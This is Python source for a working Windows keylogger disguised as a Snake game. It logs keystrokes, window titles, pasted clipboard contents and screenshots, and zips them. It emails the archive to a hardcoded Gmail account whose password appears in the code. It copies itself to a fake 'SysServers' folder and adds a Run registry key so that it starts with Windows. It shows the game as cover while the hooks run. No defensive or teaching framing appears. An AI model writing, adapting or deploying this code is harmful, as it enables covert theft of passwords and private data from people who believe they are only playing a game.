# pyinstaller -F -w -n snake -i Snake.ico system.py

import getpass
import mimetypes
import os
import shutil
import smtplib
import sys
import time
from zipfile import ZipFile, ZIP_DEFLATED
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

import pyHook
import pythoncom
import win32api
import win32clipboard
import win32con
from PIL import ImageGrab

from snake import start_game

# ***********************
# Modifiable parameters
# ***********************
# How many the user does window switches are needed for the keylogger
# to compress all the information and send it to the hacker.
SEND_INTERVAL = 3

# Mailboxes used to send packaged messages
E_ADDRESS = 'a.very.casual.email@gmail.com'
E_PASSWORD = 'HACKERNB123'
RECEIVER = E_ADDRESS

addr = sys.path[0] + '\\log.txt'
pic_path = sys.path[0] + '\\pic'
curr_window = ''
counter = 0
zip_path = sys.path[0] + '\\secret.zip'


def before_send_after():
    # Before
    with ZipFile(zip_path, "w", ZIP_DEFLATED) as zip_f, \
                            open(addr, 'a+') as log:
        for dirpath, dirnames, filenames in os.walk(pic_path):
            for filename in filenames:
                zip_f.write(os.path.join(dirpath, filename), 'pic\\' + filename)
        log.flush()
        zip_f.write(addr, 'log.txt')
        shutil.rmtree(pic_path)
        log.truncate(0) # clear log.txt

    send_email()

    # After
    os.remove(zip_path)


def send_email():
    # send ZIP to email
    global E_ADDRESS, E_PASSWORD, RECEIVER

    msg = MIMEMultipart()
    msg.attach(MIMEText("Got new classified information!", 'html'))
    msg['Subject'] = 'New Screat From %s' % getpass.getuser()
    msg['From'] = E_ADDRESS
    msg['To'] = RECEIVER

    data = open(zip_path, 'rb')
    ctype, encoding = mimetypes.guess_type(zip_path)
    if ctype is None or encoding is not None:
        ctype = 'application/octet-stream'
    maintype, subtype = ctype.split('/', 1)
    file_msg = MIMEBase(maintype, subtype)
    file_msg.set_payload(data.read())
    data.close()
    encoders.encode_base64(file_msg)
    file_msg.add_header('Content-Disposition',
                        'attachment', filename="secret.zip")
    msg.attach(file_msg)

    s = smtplib.SMTP_SSL(host='smtp.gmail.com', port=465)
    s.login(user=E_ADDRESS, password=E_PASSWORD)
    s.sendmail(E_ADDRESS, RECEIVER, msg.as_string())
    s.quit()


def KBevent(event):
    global curr_window, counter
    log = open(addr, 'a+')
    if curr_window != event.WindowName:
        # zip all info and send to the hacker
        if counter > SEND_INTERVAL:
            counter = 0
            before_send_after()
        # Keyboard record part
        curr_time = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())
        log.write("\n\n")
        curr_window = event.WindowName
        log.write("Time: %s\n" % curr_time)
        log.write("Window: %s\n" % curr_window)
        log.write("Pic ID: %s\n" % counter)
        log.write("Key: ")
        # Screen shot part
        if not os.path.exists(pic_path):
            os.makedirs(pic_path)
        pic = ImageGrab.grab()
        pic.save(os.path.join(pic_path, str(counter) + ".jpg"))
        counter += 1
    # Special handling of non-letters
    if len(event.Key) > 1:
        temp = '[' + event.Key + ']'
        log.write(temp)
    else:
        log.write(event.Key)
    if event.Key == 'V':
        win32clipboard.OpenClipboard()
        pasted_value = win32clipboard.GetClipboardData()
        win32clipboard.CloseClipboard()
        log.write("\nPASTE: %s\nKey: " % pasted_value)
    # Press the F12 key to exit the program
    log.close()
    if str(event.Key) == 'F12':
        os.remove(addr)
        shutil.rmtree(pic_path)
        win32api.PostQuitMessage()
    
    return True


# Back itself up to the system disk
if not os.path.exists('C:\\SysServers'):
    os.makedirs('C:\\SysServers')
if not os.path.exists('C:\\SysServers\\system.exe'):
    shutil.copy('snake.exe', 'C:\\SysServers')
    os.rename('C:\\SysServers\\snake.exe', 'C:\\SysServers\\system.exe')

# Add it to Windows Startup
name = 'SysServers'
path = 'C:\\SysServers\\system.exe'
KeyName = 'Software\\Microsoft\\Windows\\CurrentVersion\\Run'
key = win32api.RegOpenKey(win32con.HKEY_CURRENT_USER,
                            KeyName, 0, win32con.KEY_ALL_ACCESS)
win32api.RegSetValueEx(key, name, 0, win32con.REG_SZ, path)
# win32api.RegDeleteValue(key, name)
win32api.RegCloseKey(key)

# Run game as disguise
if os.getcwd() != 'C:\SysServers':
    # After Game Over, it will exacute the Keylogger in Backup
    start_game()

# Begin the Keylogger if it's in the Backup
if os.getcwd() == 'C:\SysServers':
    hooks_manager = pyHook.HookManager()
    hooks_manager.KeyDown = KBevent
    hooks_manager.HookKeyboard()
    pythoncom.PumpMessages()
